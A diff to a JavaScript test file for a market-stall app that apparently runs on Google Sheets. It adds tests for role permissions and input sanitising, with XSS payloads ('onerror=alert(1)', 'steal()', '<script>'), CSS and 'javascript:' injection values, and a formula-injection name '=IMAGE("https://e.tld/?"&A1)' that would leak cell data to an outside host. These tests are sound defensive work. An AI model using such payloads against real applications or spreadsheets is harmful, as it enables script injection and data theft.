@@ -31,7 +31,11 @@ function makeSheet() {
           for (let i = 0; i < nr; i++) {
             const row = rows[r - 1 + i] || [];
             const o = [];
-            for (let j = 0; j < nc; j++) o.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]);
+            for (let j = 0; j < nc; j++) {
+              const v = row[c - 1 + j] === undefined ? '' : row[c - 1 + j];
+              // Like Sheets: a leading apostrophe only marks text; reading gives the text without it.
+              o.push(typeof v === 'string' && v.charAt(0) === "'" ? v.slice(1) : v);
+            }
             out.push(o);
           }
           return out;
@@ -64,6 +68,8 @@ function load(googleTokens) {
       getActiveSpreadsheet: () => ({
         getSheetByName: (n) => sheets[n] || null,
         insertSheet: (n) => (sheets[n] = makeSheet())
+      }),
+      getUi: () => ({ alert() {} 
       })
     },
     PropertiesService: {
@@ -110,7 +116,7 @@ function load(googleTokens) {
   ctx.SF.PLATFORM.googleClientId = '';
   ctx.SF.PLATFORM.admins = [];
   ctx.SF.migrate();
-  return { SF: ctx.SF, sheets, props, gh: ctx.__gh };
+  return { SF: ctx.SF, sheets, props, gh: ctx.__gh, ctx };
 }
 
 const CLIENT = 'client-123.apps.googleusercontent.com';
@@ -709,6 +715,65 @@ test('stocktake: managers edit the locations; the list stays tidy', () => {
   assert.strictEqual(JSON.stringify(r.locations), '["Storeroom","Car boot","Kitchen"]');
   assert.strictEqual(act(SF, 'countLocationsSave', manager, { locations: [] }).ok, false);
   assert.strictEqual(SF.dispatch('countState', { token: cashier }).data.locations.length, 3);
+});
+
+/* ---------- security: who may change things, and what text may hold ---------- */
+
+test('a viewer sees the numbers but cannot change how the stall runs', () => {
+  const { SF, tok } = markets3();
+  SF.setPin('viewer', '3333'); SF.setPin('manager', '2222');
+  const viewer = SF.dispatch('signIn', { pin: '3333', device: 'v' }).data.token;
+  const manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
+  let k = 0;
+  const tryAs = (t, action, extra) => SF.dispatch(action, Object.assign({ token: t, opId: 'sec' + (k++) }, extra || {}));
+  [['setPreordersOpen', { open: false }], ['addMarket', { name: 'Sneaky Market' }], ['releaseUnpaid', {}],
+   ['setActiveMarket', { marketId: 'M02' }], ['saveLabelLook', { contact: 'x' }], ['setCollectStep', { on: true }],
+   ['setHomeOrders', { open: false }], ['savePluginSettings', { plugin: 'cashup', values: {} }],
+   ['saveProfile', { name: 'X' }]].forEach(([a, extra]) => {
+    const r = tryAs(viewer, a, extra);
+    assert.strictEqual(r.ok, false, a + ' should be refused for a viewer');
+    assert.strictEqual(r.code, 'forbidden', a);
+  });
+  assert.strictEqual(SF.dispatch('dashboard', { token: viewer }).ok, true, 'the numbers still work for a viewer');
+  assert.strictEqual(tryAs(manager, 'setPreordersOpen', { open: true }).ok, true, 'a manager may');
+  assert.strictEqual(tryAs(manager, 'addMarket', { name: 'Real Market', date: day(4) }).ok, true);
+  assert.strictEqual(tryAs(tok, 'setActiveMarket', { marketId: 'M02' }).ok, true, 'and the owner');
+});
+
+test('a market date must be a date, and the live market must exist', () => {
+  const { SF, tok } = markets3();
+  const bad = SF.dispatch('addMarket', { token: tok, opId: 'd1', name: 'Bad', date: '2099-01-01<img src=x onerror=alert(1)>' });
+  assert.strictEqual(bad.ok, false);
+  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd2', name: 'Good', date: '2026-12-05' }).ok, true);
+  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd3', name: 'No date yet' }).ok, true);
+  assert.strictEqual(SF.dispatch('setActiveMarket', { token: tok, opId: 'd4', marketId: 'zzz' }).ok, false);
+  assert.strictEqual(SF.get('activeMarket'), 'M01', 'unchanged');
+});
+
+test('shop words are plain text, when saved and when read back from older data', () => {
+  const { SF, tok } = markets3();
+  SF.dispatch('saveProfile', { token: tok, opId: 'v1', colour: 'red;background:url(x)',
+    vocab: { units: '<img src=x onerror="steal()">jars', unit: 'jar', evil: 'x' }, plugins: ['cashup', 'nope'] });
+  let pr = SF.profile();
+  assert.ok(!/[<>"=]/.test(pr.vocab.units), pr.vocab.units);
+  assert.strictEqual(pr.vocab.evil, undefined, 'unknown words are dropped');
+  assert.strictEqual(pr.colour, '#7B2D43', 'a colour must be a colour');
+  assert.strictEqual(JSON.stringify(pr.plugins), '["cashup"]');
+  // Data stored before this check existed is cleaned on the way out.
+  SF.set('profile', JSON.stringify({ vocab: { units: '<script>bad()</script>' }, colour: 'javascript:x' }));
+  pr = SF.profile();
+  assert.ok(!/[<>()]/.test(pr.vocab.units), pr.vocab.units);
+  assert.strictEqual(pr.colour, '#7B2D43');
+});
+
+test('Export orders keeps a customer name that starts with = as text', () => {
+  const { SF, sheets, ctx } = markets3();
+  assert.strictEqual(order(SF, { market: 'M01', name: '=IMAGE("https://e.tld/?"&A1)' }).ok, true);
+  ctx.sfExport();
+  const out = Object.keys(sheets).filter((n) => /^Orders \d/.test(n)).map((n) => sheets[n])[0];
+  assert.ok(out, 'the export tab was made');
+  const cell = out.rows[1][4];
+  assert.ok(String(cell).startsWith("'="), 'stays text: ' + cell);
 });
 
 /* ---------- reporting a problem ---------- */
